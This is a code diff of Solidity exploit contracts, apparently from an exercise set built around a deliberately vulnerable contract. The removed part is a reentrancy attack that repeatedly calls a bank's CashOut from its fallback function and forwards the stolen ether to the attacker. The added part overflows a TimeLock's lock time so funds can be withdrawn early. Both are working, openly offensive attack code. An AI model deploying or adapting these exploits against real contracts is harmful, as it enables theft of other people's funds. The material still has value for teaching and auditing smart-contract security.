@@ -1,48 +1,26 @@
-pragma solidity ^0.4.19;
+pragma solidity ^0.7.6;
 
 import "./vulnerable_contract.sol";
 
-contract ReentrancyExploit {
-    PrivateBank public target;
-    uint public amount = 1 ether;
-    
-    // Initialize the target contract
-    function ReentrancyExploit(address _target) public {
-        target = PrivateBank(_target);
+contract MaliciousContract {
+    TimeLock public timeLock;
+
+    constructor(TimeLock _timeLock) {
+        timeLock = _timeLock;
     }
-    
-    // Function to start the attack
+
     function attack() public payable {
-        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
-        
-        // First deposit into the vulnerable contract
-        target.Deposit.value(msg.value)();
-        
-        // Start the reentrancy attack by calling CashOut
-        target.CashOut(msg.value);
+        // Step 1: Deposit funds to become a participant
+        timeLock.deposit{value: msg.value}();
+
+        // Step 2: Overflow the lockTime
+        uint256 maxUint = type(uint256).max;
+        uint256 timeToOverflow = maxUint - timeLock.lockTime(address(this)) + 1;
+        timeLock.increaseLockTime(timeToOverflow);
+
+        // Step 3: Attempt withdrawal before 1-week due to overflow
+        timeLock.withdraw();
     }
-    
-    // Fallback function where the reentrancy magic happens
-    function() public payable {
-        // If there's still balance in the target contract, keep withdrawing
-        if (address(target).balance >= amount) {
-            target.CashOut(amount);
-        }
-    }
-    
-    // Function to withdraw the stolen funds to the attacker
-    function withdraw() public {
-        require(address(this).balance > 0, "No funds to withdraw");
-        msg.sender.transfer(address(this).balance);
-    }
-    
-    // Function to check contract's balance
-    function getBalance() public view returns (uint) {
-        return address(this).balance;
-    }
-    
-    // Function to check target contract's balance
-    function getTargetBalance() public view returns (uint) {
-        return address(target).balance;
-    }
+
+    receive() external payable {} 
 }
